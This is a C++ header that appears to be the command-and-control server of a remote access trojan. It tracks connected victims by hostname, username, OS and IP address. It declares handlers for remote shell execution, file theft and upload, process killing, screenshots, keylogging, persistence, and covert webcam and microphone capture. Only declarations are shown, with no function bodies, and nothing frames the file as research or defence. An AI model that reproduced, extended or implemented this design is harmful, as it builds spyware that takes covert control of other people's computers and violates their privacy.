#ifndef SERVER_H
#define SERVER_H

#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <iostream>
#include <functional>
#include <memory>
#include <csignal>

#include "../../common/src/protocol.h"
#include "../../common/src/network.h"
#include "../../common/src/utils.h"

class ClientHandler
{
private:
    std::shared_ptr<Connection> connection;
    std::string client_id;
    std::string hostname;
    std::string os_info;
    std::string username;
    std::string ip_address;
    int port;
    std::atomic<bool> is_running;
    std::thread client_thread;
    std::map<uint16_t, std::function<bool(const std::vector<uint8_t> &, uint32_t)>> command_handlers;

public:
    ClientHandler(std::shared_ptr<Connection> conn);
    ~ClientHandler();

    void start();
    void stop();
    bool executeCommand(uint16_t command, const std::vector<uint8_t> &payload = {});
    bool isConnected() const;

    // Getters
    const std::string &getClientId() const { return client_id; }
    const std::string &getHostname() const { return hostname; }
    const std::string &getOSInfo() const { return os_info; }
    const std::string &getUsername() const { return username; }
    const std::string &getIPAddress() const { return ip_address; }
    int getPort() const { return port; }

private:
    void handleClient();
    void setupCommandHandlers();
    bool handleSystemInfo(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handlePing(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleShellExec(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileList(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileDownload(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileUpload(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleProcessList(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleProcessKill(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleScreenshot(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleKeylogger(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handlePersistence(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleWebcam(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleMicrophone(const std::vector<uint8_t> &payload, uint32_t sequence);
};

class Server
{
private:
    int server_socket;
    uint16_t port;
    std::string bind_address;
    std::atomic<bool> is_running;
    std::thread accept_thread;
    mutable std::mutex clients_mutex;
    std::map<std::string, std::shared_ptr<ClientHandler>> clients;
    std::function<void(std::shared_ptr<ClientHandler>)> client_callback;

public:
    Server(uint16_t port = DEFAULT_PORT, const std::string &bind_addr = "0.0.0.0");
    ~Server();

    void start();
    void stop();
    void setClientCallback(std::function<void(std::shared_ptr<ClientHandler>)> callback);

    std::vector<std::string> getClientList() const;
    std::shared_ptr<ClientHandler> getClient(const std::string &client_id) const;
    bool removeClient(const std::string &client_id);
    void broadcastCommand(uint16_t command, const std::vector<uint8_t> &payload = {});

private:
    void acceptConnections();
};

#endif // SERVER_H